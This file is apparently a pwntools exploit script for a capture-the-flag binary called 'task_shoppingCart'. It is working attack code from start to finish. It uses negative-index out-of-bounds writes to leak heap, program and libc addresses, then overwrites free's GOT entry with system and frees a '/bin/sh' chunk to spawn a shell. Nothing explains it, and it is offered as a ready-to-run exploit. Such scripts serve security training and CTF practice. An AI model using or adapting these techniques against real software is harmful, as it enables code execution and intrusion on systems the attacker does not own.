from pwn import *
r = process('./task_shoppingCart')
elf = ELF('task_shoppingCart')
libc = ELF('libc-2.23.so')

def getMoney(kind):
	r.sendlineafter('man!\n','1')
	r.sendlineafter('Dollar?\n',kind)
def enterNext():
	r.sendlineafter('man!\n','3')

for i in range(20):
	getMoney('RMB')
enterNext()

def recordName(size,name):
	r.sendlineafter('Now, buy buy buy!\n','1')
	r.sendlineafter('How long is your goods name?\n',str(size))
	r.sendlineafter('What is your goods name?\n',name)
def X_recordName():
	r.sendlineafter('Now, buy buy buy!\n','1')
	r.sendlineafter('How long is your goods name?\n','0')
def modifyName(index,name):
	r.sendlineafter('Now, buy buy buy!\n','3')
	r.sendlineafter('Which goods you need to modify?\n',str(index))
	r.sendafter('to?\n',name)
def X_modifyName(index,name):
	r.sendlineafter('Now, buy buy buy!\n','3')
	r.sendlineafter('Which goods you need to modify?\n',str(index))
	r.recvuntil('OK, what would you like to modify ')
	leak = u64(r.recv(6).ljust(8,'\x00'))
	r.sendafter('to?\n',name)
	return leak
def Y_modifyName(index):
	r.sendlineafter('Now, buy buy buy!\n','3')
	r.sendlineafter('Which goods you need to modify?\n',str(index))
	r.recvuntil('OK, what would you like to modify ')
	leak = u64(r.recv(6).ljust(8,'\x00'))
	r.sendafter('to?\n',p64(leak))
	return leak
def deleteName(index):
	r.sendlineafter('Now, buy buy buy!\n','2')
	r.sendlineafter("Which goods that you don't need?\n",str(index))

log.success('======== LEAK STAT ========')

recordName(0x10,'aaaa')#0
recordName(0x10,'bbbb')#1
recordName(0x10,'cccc')#2
deleteName(0)
deleteName(1)
X_recordName()#3
leak0 = X_modifyName(3,'/bin/sh\x00')
hpbase = leak0 - 0x16a0
log.info('HEAP BASE -> '+str(hex(hpbase)))

leak1 = Y_modifyName(-47)
prbase = leak1 - 0x202068
log.info('PROC BASE -> '+str(hex(prbase)))

modifyName(-0x14,p64(prbase+0x2020a8))
modifyName(-0x13,p64(prbase+elf.got['free']))
leak2 = X_modifyName(-0x28,p64(prbase+elf.plt['free'])[:-1])
libase = leak2 - libc.symbols['free']
log.info('LIBC BASE -> '+str(hex(libase)))

log.success('======== LEAK DONE ========')

modifyName(-0x28,p64(libase+libc.symbols['system'])[:-1])
deleteName(3)
r.recv()
r.interactive()
